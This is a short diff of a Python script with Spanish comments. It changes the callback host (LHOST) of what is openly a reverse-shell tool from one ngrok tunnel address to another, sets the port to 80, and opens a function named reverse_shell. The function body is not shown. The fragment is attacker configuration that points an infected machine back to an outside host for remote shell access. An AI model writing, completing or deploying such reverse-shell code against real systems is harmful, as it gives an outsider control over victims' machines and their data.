@@ -3,7 +3,7 @@ import subprocess
 import os
 
 # Configuración
-LHOST = "a502-167-60-62-81.ngrok-free.app"  # Dirección de tu ngrok
+LHOST = "https://06ac-167-60-62-81.ngrok-free.app"  # Dirección de tu ngrok
 LPORT = 80  # Puerto al que conectará
 
 def reverse_shell():
